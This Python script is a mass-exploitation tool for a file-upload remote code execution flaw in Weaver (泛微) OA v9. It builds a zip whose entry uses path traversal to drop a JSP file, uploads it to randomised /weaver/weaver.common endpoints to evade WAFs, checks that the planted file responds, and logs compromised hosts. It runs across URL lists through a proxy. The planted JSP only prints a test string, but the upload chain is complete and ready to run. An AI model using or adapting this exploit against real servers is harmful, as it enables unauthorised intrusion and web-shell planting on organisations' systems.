'''
Descripttion: fanwei v9 rce
Author: Zhu013
Date: 2021-04-29 22:38:37
'''

import zipfile,os
import requests
import random
import argparse
import os
import gevent
import gevent.pool
import time

shell=b'''
<% out.print("this is test");%>
'''

proxy={'socks5':'socoks5://127.0.0.1:1080'}

dir_path = os.path.dirname(os.path.abspath(__file__))
parser = argparse.ArgumentParser(description="请输入目标")
parser.add_argument('-u',type=str,help='请输入url',dest='url',default='')
parser.add_argument('-f',type=str,help='请插入url文件',dest='file',default='')
parser.add_argument('-t',type=str,help='请输入线程数，默认为10',dest='thread',default='10')

args = parser.parse_args()
Get_url = args.url
Get_file = args.file
Get_thread = int(args.thread)

def banner():
    banner = '''
_______________  ___________    _________                          .__  __          
\_   _____/\   \/  /\______ \  /   _____/ ____   ____  __ _________|__|/  |_ ___.__.
 |    __)   \     /  |    |  \ \_____  \_/ __ \_/ ___\|  |  \_  __ \  \   __<   |  |
 |     \    /     \  |    `   \/        \  ___/\  \___|  |  /|  | \/  ||  |  \___  |
 \___  /   /___/\  \/_______  /_______  /\___  >\___  >____/ |__|  |__||__|  / ____|
     \/          \_/        \/        \/     \/     \/                       \/        

                                            泛微OA v9 MixRandRce
                                            Author:Zhu013
                                            单目标:python fanwei_rce.py -u url
                                            多目标:python fanwei_rce.py -f *.txt
                                            线程参数 -t 默认为10
    '''
    print(banner)

def Zfile(randomname,randomfile):
    try:
        zipFile = zipfile.ZipFile(dir_path+randomfile+".zip","a",zipfile.ZIP_DEFLATED)
        zipFile.writestr("../../../../"+randomname+'.jsp',shell)
        zipFile.close()
    except IOError as e:
        raise e

def getrandstr():
    try:
        number1 = random.randint(1,9)
        randomgroup1 = random.sample(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"],number1)
        randomname = ''.join(randomgroup1)
        number2 = random.randint(1,9)
        randomgroup2 = random.sample(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"],number2)
        randomfile = ''.join(randomgroup2)
        return randomname,randomfile
    except IOError as e:
        raise e

def generate_mixture_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

def get_randompayload():
    try:
        mixnumber = random.randint(50,200)
        mixture = generate_mixture_str(mixnumber)
        number1 = 1
        payload_random1 = random.sample([".gif",".jpg",".jpeg",".png",".js",".css",".swf",".cur",".flv",".avi",".wma",".wmv",".mp3",".mp4",".3gp",".zip",".rar",".rtf",".doc",".ico",".exe",".msi",".xml"],number1)
        payload1=''.join(payload_random1)
        number2 = 1
        payload_random2 = random.sample(["Ctrl","DownloadServlet"],number2)
        payload2 = "".join(payload_random2)
        return payload1,payload2,mixture
    except IOError as e:
        raise e

def fw_upload(host,randomname,randomfile):
    payload1,payload2,mixture = get_randompayload()
    url = host + "/weaver/weaver.common."+payload2+"/"+mixture+payload1+"?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163'
    }
    files = {
        'filename':(randomfile+'.zip',open(dir_path+randomfile+".zip",'rb'),'application/octet-stream')
    }
    try:
        retest =requests.get(url,headers=headers,timeout=5,proxies=proxy)
        if(retest.status_code ==200):
            print("[+]target maybe vuln-----------------------"+host)
            re = requests.post(url,headers=headers,files=files,timeout=5,proxies=proxy)
            url_check = host+"/"+randomname+'.jsp'
            re_check = requests.get(url=url_check,headers=headers,proxies=proxy)
            if(re_check.status_code == 200):
                print("[+]exploit success -----------------------"+url_check)
                with open('vul.txt','a+',encoding="utf-8") as s:
                    s.write(url_check+'\n')
            else:
                print("[-]faild! maybe waf-----------------------signing the url")
                with open('vul_waf.txt','a+',encoding="utf-8") as s:
                    s.write(host+'\n')
    except Exception as e:
        print('[-]target error！-----------------------'+host+'\n',e)

def main(host):
    randomname,randomfile = getrandstr()
    Zfile(randomname,randomfile)
    fw_upload(host,randomname,randomfile)
    pass
    
def filelist():
    print("[+]start url list")
    start = time.time()
    g = gevent.pool.Pool(Get_thread)
    run_list = []
    with open(args.file,'r+',encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            if 'http://' in s:
                run_list.append(g.spawn(main(s)))
            else:
                exp1 = 'http://'+s
                run_list.append(g.spawn(main(exp1)))
    
    gevent.joinall(run_list)
    end=time.time()
    print("[*]总耗时%s"%time.strftime("%H:%M:%S",time.gmtime(end-start)))

if __name__ == "__main__": 
    banner()
    try:
        if Get_url != '' and Get_file == '':
            if 'http://' in Get_url:
                url1=Get_url
                main(url1)
            else:
                url2 = 'http://'+Get_url
                main(url2)
        elif Get_url == '' and Get_file != '':
            filelist()
    except KeyboardInterrupt:
        print("end")
        pass